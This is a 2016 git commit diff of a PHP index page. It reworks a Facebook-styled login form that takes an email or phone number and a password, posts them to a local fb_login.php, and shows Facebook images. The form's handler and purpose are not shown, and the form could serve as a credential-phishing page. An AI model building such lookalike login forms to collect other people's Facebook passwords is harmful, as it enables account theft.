39460ca29406810a9d2a742cdf881791463bd70f
hrib <hugo.dose@gmail.com>
2016-07-08 15:17:56 +0100

    Update index.php

--- index.php
+++ index.php
@@ -1,16 +1,22 @@
 <?php
 
 unlink('mirazmac_cookie.txt');
-      echo '<div align="right">';
-      echo '<form action="fb_login.php" method="post">';
-      echo '<font style="font-family:arial; font-size:9px;">Email or Phone </font><input type="text" name="user" style="font-family:arial; font-size:9px; width: 200px; margin-left: 0px; margin-top: 10px;">';
-      echo '<font style="font-family:arial; font-size:9px;">   Password </font><input type="password" name="password" style="font-family:arial; font-size:9px; width: 200px; margin-left: 0px; margin-top: 10px;">';
-      echo '<input type="submit" value="Log In" style="font-family:arial; font-size:9px; margin-left: 10px; margin-top: 10px;">';
-      echo '</form>'; 
-      echo '</div>';
+      //echo '<div align="right">';
+      //echo '<form action="fb_login.php" method="post">';
+      //echo '<font style="font-family:arial; font-size:9px;">Email or Phone </font><input type="text" name="user" style="font-family:arial; font-size:9px; width: 200px; margin-left: 0px; margin-top: 10px;">';
+      //echo '<font style="font-family:arial; font-size:9px;">   Password </font><input type="password" name="password" style="font-family:arial; font-size:9px; width: 200px; margin-left: 0px; margin-top: 10px;">';
+      //echo '<input type="submit" value="Log In" style="font-family:arial; font-size:9px; margin-left: 10px; margin-top: 10px;">';
+      //echo '</form>'; 
+      //echo '</div>';
 ?>
+<div align="right">
+  <form action="fb_login.php" method="post">
+      <font style="font-family:arial; font-size:9px;">Email or Phone </font><input type="text" name="user" style="font-family:arial; font-size:9px; width: 200px; margin-left: 0px; margin-top: 10px;">
+      <font style="font-family:arial; font-size:9px;">   Password </font><input type="password" name="password" style="font-family:arial; font-size:9px; width: 200px; margin-left: 0px; margin-top: 10px;">
+      <input type="image" src="fb.png" alt="Submit">
+  </form>
+</div>
 
-<img src='fb.png'>
 <img src='facebook.png'>
 
 
